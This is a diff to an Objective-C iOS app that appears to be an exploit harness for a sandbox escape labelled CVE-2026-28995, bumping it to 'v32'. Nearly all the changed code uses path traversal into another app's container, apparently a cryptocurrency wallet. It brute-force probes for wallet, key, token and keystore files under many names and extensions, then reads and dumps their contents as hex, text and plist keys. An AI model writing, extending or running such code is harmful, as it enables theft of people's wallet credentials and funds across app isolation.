@@ -719,7 +719,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v31" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v32" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7580,46 +7580,58 @@ static void *iohid_threadCopyEvent(void *arg) {
     }
     [log appendFormat:@"  Extensionless hits: %d\n", hits];
 
-    // Part E: Read Documents/cache content (found in v30, 1248 bytes)
-    [log appendString:@"\n[Part E] Read Documents/cache file content:\n"];
-    NSString *cacheRel = [NSString stringWithFormat:@"%s/Documents/cache",
-        [tpBase UTF8String]];
-    NSString *cachePath = TRYFILE(cacheRel);
-    BOOL cacheExists = [fm fileExistsAtPath:cachePath];
-    [log appendFormat:@"  Documents/cache exists: %@\n", cacheExists ? @"YES" : @"NO"];
-    if (cacheExists) {
-        NSDictionary *attrs = [fm attributesOfItemAtPath:cachePath error:nil];
-        [log appendFormat:@"  size: %llu bytes\n", [attrs[NSFileSize] unsignedLongLongValue]];
-        // Read raw bytes
-        int fd = open([cachePath UTF8String], O_RDONLY);
-        if (fd >= 0) {
-            unsigned char buf[128];
-            ssize_t n = read(fd, buf, sizeof(buf));
-            if (n > 0) {
-                NSMutableString *hex = [NSMutableString string];
-                for (int i = 0; i < MIN(64, n); i++)
-                    [hex appendFormat:@"%02x ", buf[i]];
-                [log appendFormat:@"  first %zd bytes hex: %@\n", n, hex];
-                // Check for known magic
-                BOOL isSQLite = (n >= 16 && memcmp(buf, sqliteMagic, 16) == 0);
-                BOOL isBplist = (n >= 6 && memcmp(buf, "bplist", 6) == 0);
-                BOOL isJSON = (buf[0] == '{' || buf[0] == '[');
-                BOOL isXML = (n >= 5 && memcmp(buf, "<?xml", 5) == 0);
-                [log appendFormat:@"  type: %s\n",
-                    isSQLite ? "SQLite3" : isBplist ? "binary plist" :
-                    isJSON ? "JSON" : isXML ? "XML" : "unknown"];
-                // Try as UTF-8 string
-                if (!isBplist && !isSQLite) {
-                    NSString *str = [[NSString alloc] initWithBytes:buf length:n encoding:NSUTF8StringEncoding];
-                    if (str) [log appendFormat:@"  as UTF-8: %@\n", [str substringToIndex:MIN(300, str.length)]];
-                }
+    // Part E: Read TP files via Foundation (POSIX open fails on traversed paths)
+    [log appendString:@"\n[Part E] Read discovered TP files (Foundation I/O):\n"];
+    NSArray *foundFiles = @[
+        @[@"Documents/cache", @"1248"],
+        @[@"Documents/db", @"128"],
+    ];
+    for (NSArray *finfo in foundFiles) {
+        NSString *fname = finfo[0];
+        NSString *rel = [NSString stringWithFormat:@"%s/%@",
+            [tpBase UTF8String], fname];
+        NSString *fpFull = TRYFILE(rel);
+        BOOL ex = [fm fileExistsAtPath:fpFull];
+        if (!ex) { [log appendFormat:@"  %@: NOT FOUND\n", fname]; continue; }
+        NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
+        unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
+        [log appendFormat:@"\n  --- %@ (%llu bytes) ---\n", fname, sz];
+
+        // Try NSData for raw bytes
+        NSData *data = [NSData dataWithContentsOfFile:fpFull];
+        if (data) {
+            const unsigned char *bytes = data.bytes;
+            NSUInteger len = data.length;
+            NSUInteger dumpLen = MIN(80, len);
+            NSMutableString *hex = [NSMutableString string];
+            for (NSUInteger i = 0; i < dumpLen; i++)
+                [hex appendFormat:@"%02x ", bytes[i]];
+            [log appendFormat:@"  hex (%lu/%lu): %@\n", (unsigned long)dumpLen, (unsigned long)len, hex];
+            // Check magic
+            BOOL isSQLite = (len >= 16 && memcmp(bytes, "SQLite format 3", 16) == 0);
+            BOOL isBplist = (len >= 6 && memcmp(bytes, "bplist", 6) == 0);
+            BOOL isJSON = (bytes[0] == '{' || bytes[0] == '[');
+            BOOL isXML = (len >= 5 && memcmp(bytes, "<?xml", 5) == 0);
+            NSString *ftype = isSQLite ? @"SQLite3" : isBplist ? @"binary plist" :
+                              isJSON ? @"JSON" : isXML ? @"XML/plist" : @"unknown";
+            [log appendFormat:@"  type: %@\n", ftype];
+            // Try UTF-8
+            if (!isBplist && !isSQLite) {
+                NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+                if (str) [log appendFormat:@"  UTF-8: %@\n", [str substringToIndex:MIN(500, str.length)]];
             }
-            close(fd);
+            // Try bplist parsing
+            if (isBplist) {
+                NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:fpFull];
+                if (plist) [log appendFormat:@"  plist keys: %@\n", [[plist allKeys] componentsJoinedByString:@", "]];
+            }
+        } else {
+            [log appendString:@"  [-] NSData read FAILED\n"];
         }
     }
 
-    // Part F: Probe v30-found extensionless files across ALL subdirs
-    [log appendString:@"\n[Part F] Probe extensionless files in all subdirs:\n"];
+    // Part F: Probe extensionless files across expanded subdirs
+    [log appendString:@"\n[Part F] Extensionless probe (all subdirs):\n"];
     hits = 0;
     const char *extraSubdirs[] = {
         "Library/Caches/com.global.wallet.ios/",
@@ -7628,6 +7640,7 @@ static void *iohid_threadCopyEvent(void *arg) {
         "Library/",
         "Library/Application Support/",
         "Library/Preferences/",
+        "",
         NULL
     };
     const char *simpleNames[] = {
@@ -7637,12 +7650,24 @@ static void *iohid_threadCopyEvent(void *arg) {
         "Cache","Data","DB","Wallet","Main","Default","Storage",
         "Config","Settings","Tokens","Accounts","KeyStore",
         "Tron","TRX","ETH","BTC","SOL","Global",
+        "wallet_data","wallet_db","tp_wallet","tp_data","tp_db",
+        "tron_wallet","tron_data","tron_db","token_data","token_db",
+        "chain_db","global_wallet","global_wallet_db",
+        "db_main","db_wallet","db_tron","db_token",
+        "wallet_store","secure_db","encrypted_db",
         NULL
     };
-    for (int si = 0; extraSubdirs[si]; si++) {
-        for (int ni = 0; simpleNames[ni]; ni++) {
-            NSString *rel = [NSString stringWithFormat:@"%s/%s%s",
-                [tpBase UTF8String], extraSubdirs[si], simpleNames[ni]];
+    for (int si = 0; extraSubdirs[si] != NULL; si++) {
+        for (int ni = 0; simpleNames[ni] != NULL; ni++) {
+            // Build path — subdir may be empty string for root
+            NSString *rel;
+            if (strlen(extraSubdirs[si]) > 0) {
+                rel = [NSString stringWithFormat:@"%s/%s%s",
+                    [tpBase UTF8String], extraSubdirs[si], simpleNames[ni]];
+            } else {
+                rel = [NSString stringWithFormat:@"%s/%s",
+                    [tpBase UTF8String], simpleNames[ni]];
+            }
             NSString *fpFull = TRYFILE(rel);
             BOOL ex = [fm fileExistsAtPath:fpFull];
             if (ex) {
@@ -7650,12 +7675,51 @@ static void *iohid_threadCopyEvent(void *arg) {
                 unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
                 BOOL isDir = [attrs[NSFileType] isEqualToString:NSFileTypeDirectory];
                 [log appendFormat:@"  [+] %s%s (%llu bytes)%s\n",
-                    extraSubdirs[si], simpleNames[ni], sz, isDir ? @" [DIR]" : @""];
+                    extraSubdirs[si], simpleNames[ni], sz, isDir ? " [DIR]" : ""];
                 hits++;
             }
         }
     }
-    [log appendFormat:@"  Extensionless hits: %d\n", hits];
+    [log appendFormat:@"  Extensionless hits: %d (probes: %d subdirs x %d names = %d)\n",
+        hits,
+        (int)(sizeof(extraSubdirs)/sizeof(extraSubdirs[0])-1),
+        (int)(sizeof(simpleNames)/sizeof(simpleNames[0])-1),
+        (int)(sizeof(extraSubdirs)/sizeof(extraSubdirs[0])-1) *
+        (int)(sizeof(simpleNames)/sizeof(simpleNames[0])-1)];
+
+    // Part G: Probe with .dat/.bin/.idx/.key/.txt extensions
+    [log appendString:@"\n[Part G] Probe non-standard extensions:\n"];
+    hits = 0;
+    const char *altExts[] = {".dat",".bin",".idx",".key",".txt",".json",".plist",".conf",NULL};
+    const char *altNames[] = {
+        "wallet","tron","trx","eth","btc","sol","data","db","cache",
+        "key","keys","token","tokens","config","settings","accounts","main",
+        NULL
+    };
+    for (int si = 0; extraSubdirs[si] != NULL; si++) {
+        for (int ni = 0; altNames[ni] != NULL; ni++) {
+            for (int ei = 0; altExts[ei] != NULL; ei++) {
+                NSString *rel;
+                if (strlen(extraSubdirs[si]) > 0) {
+                    rel = [NSString stringWithFormat:@"%s/%s%s%s",
+                        [tpBase UTF8String], extraSubdirs[si], altNames[ni], altExts[ei]];
+                } else {
+                    rel = [NSString stringWithFormat:@"%s/%s%s",
+                        [tpBase UTF8String], altNames[ni], altExts[ei]];
+                }
+                NSString *fpFull = TRYFILE(rel);
+                BOOL ex = [fm fileExistsAtPath:fpFull];
+                if (ex) {
+                    NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
+                    [log appendFormat:@"  [+] %s%s%s (%llu bytes)\n",
+                        extraSubdirs[si], altNames[ni], altExts[ei],
+                        [attrs[NSFileSize] unsignedLongLongValue]];
+                    hits++;
+                }
+            }
+        }
+    }
+    [log appendFormat:@"  Alt-extension hits: %d\n", hits];
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
